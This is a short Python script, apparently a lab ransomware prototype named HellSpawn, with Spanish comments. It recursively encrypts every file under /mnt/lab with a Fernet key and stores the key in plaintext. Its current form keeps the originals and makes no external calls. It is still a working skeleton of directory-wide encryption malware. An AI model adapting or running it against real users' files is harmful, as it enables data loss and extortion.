# HellSpawn.py
# Cifra el contenido del directorio con una llave cifrada

import os
from cryptography.fernet import Fernet

def generate_key():
    """Genera una clave de cifrado.

    Returns:
        bytes: Clave de cifrado generada.
    """
    return Fernet.generate_key()

def encrypt_file(file_path, key, encrypted_extension='.encrypted'):
    """Cifra un archivo.

    Lee el contenido de un archivo, lo cifra utilizando una clave proporcionada
    y guarda el contenido cifrado en un nuevo archivo con la extensión
    especificada.

    Args:
        file_path (str): Ruta del archivo a cifrar.
        key (bytes): Clave de cifrado.
        encrypted_extension (str, optional): Extensión para el archivo cifrado.
            Por defecto es '.encrypted'.
    """
    with open(file_path, 'rb') as f:
        data = f.read()
    
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    
    encrypted_file_path = file_path + encrypted_extension
    with open(encrypted_file_path, 'wb') as f:
        f.write(encrypted_data)

if __name__ == "__main__":
    # Especifica el directorio que quieres cifrar
    directorio_a_cifrar = r"/mnt/lab"
    
    # Generar una clave de cifrado
    key = generate_key()
    
    # Guardar la clave en un archivo plano
    with open("clave_cifrado.txt", "wb") as f:
        f.write(key)
    
    # Cifrar los archivos en el directorio especificado
    for root, dirs, files in os.walk(directorio_a_cifrar):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
    
    print(f"Simbiote ha cifrado los archivos en {directorio_a_cifrar} con éxito. La clave de cifrado se ha guardado en clave_cifrado.txt.")
